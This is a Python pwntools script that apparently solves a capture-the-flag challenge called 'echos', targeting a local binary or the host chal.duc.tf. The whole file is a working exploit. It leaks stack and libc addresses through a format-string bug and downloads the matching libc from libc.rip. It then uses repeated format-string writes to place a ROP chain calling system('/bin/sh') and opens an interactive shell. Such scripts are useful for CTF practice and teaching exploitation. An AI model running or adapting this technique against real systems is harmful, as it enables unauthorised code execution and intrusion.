#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./echos')
context.log_level = 'INFO'

if not args.REMOTE:
	context.log_file = 'local.log'
	libc = binary.libc
	p = process(binary.path)
else:
	context.log_file = 'remote.log'
	libc_index = 3
	p = remote('chal.duc.tf', 30001)

p.sendline('%6$p,%19$p')
_ = p.recvline().strip().split(b',')

stack_ret_addr = int(_[0],16) + 72
log.info('stack_ret_addr: ' + hex(stack_ret_addr))

__libc_start_main_231 = int(_[1],16)
log.info('__libc_start_main_231: ' + hex(__libc_start_main_231))
log.info('__libc_start_main: ' + hex(__libc_start_main_231 - 231))

if not 'libc' in locals():
	try:
		import requests
		r = requests.post('https://libc.rip/api/find', json = {'symbols':{'__libc_start_main':hex(__libc_start_main_231 - 231)[-3:]}})
		libc_url = r.json()[libc_index]['download_url']
		libc_file = libc_url.split('/')[-1:][0]
		if not os.path.exists(libc_file):
			log.info('getting: ' + libc_url)
			r = requests.get(libc_url, allow_redirects=True)
			open(libc_file,'wb').write(r.content)
	except:
		log.critical('get libc yourself!')
		sys.exit(0)
	libc = ELF(libc_file)

libc.address = __libc_start_main_231 - libc.sym.__libc_start_main - 231
log.info('libc.address: ' + hex(libc.address))

offset = 8
rop = ROP([libc])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

# unlimited free rides
payload = fmtstr_payload(offset,{stack_ret_addr-0x5c:0x80000000})
p.sendline(payload)
null = payload.find(b'\x00')
p.recvuntil(payload[null-2:null])

payloads = [pop_rdi + 1,pop_rdi,libc.search(b'/bin/sh').__next__(),libc.sym.system]
for i in range(len(payloads)):
	payload=fmtstr_payload(offset,{stack_ret_addr+8*i:payloads[i]},write_size='short')
	p.sendline(payload)
	null = payload.find(b'\x00')
	p.recvuntil(payload[null-2:null])

# game over
payload = fmtstr_payload(offset,{stack_ret_addr-0x5c:0x00000003})
p.sendline(payload)
null = payload.find(b'\x00')
p.recvuntil(payload[null-2:null])
p.interactive()
